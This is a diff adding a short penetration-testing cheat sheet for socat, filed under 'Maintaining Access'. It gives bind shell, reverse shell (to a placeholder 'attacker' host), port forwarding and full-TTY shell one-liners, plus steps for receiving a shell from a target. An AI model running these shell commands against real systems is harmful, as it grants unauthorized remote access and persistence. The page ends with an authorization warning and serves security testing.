@@ -1,0 +1,55 @@
+Socat
+Multipurpose relay for bidirectional data transfer
+
+Maintaining Access
+Description
+Socat is a command-line utility that establishes two bidirectional byte streams and transfers data between them. More powerful than netcat.
+
+Installation / Check
+Check if installed:
+
+which socat
+Install command:
+
+sudo apt install socat
+Basic Syntax
+socat [options] <address1> <address2>
+Common Commands
+Command	What it does	When to use	Risk
+socat TCP-L:4444,fork EXEC:/bin/bash
+
+Bind shell	Create listening shell	
+socat TCP:attacker:4444 EXEC:/bin/bash
+
+Reverse shell	Connect back	
+socat TCP-L:4444,fork TCP:target:22
+
+Port forward	Redirect traffic	
+socat - OPENSSL:target:443
+
+SSL connection	Encrypted connection	
+socat TCP-L:4444,reuseaddr,fork EXEC:"bash -li",pty,stderr,setsid,sigint,sane
+
+Interactive shell	Full TTY shell	
+Step-by-Step Guide
+1
+Start listener on attacker
+2
+Execute socat on target
+3
+Receive shell connection
+4
+Use for encrypted transfers
+5
+Forward ports as needed
+Understanding the Output
+Bidirectional data stream between two endpoints.
+
+Important Warnings
+•
+More powerful than netcat
+•
+Can bypass firewalls
+•
+Use only with authorization
+⚠️ Use Kali Linux tools only on systems you own or have written permission to test. Unauthorized hacking is illegal and can result in criminal charges.
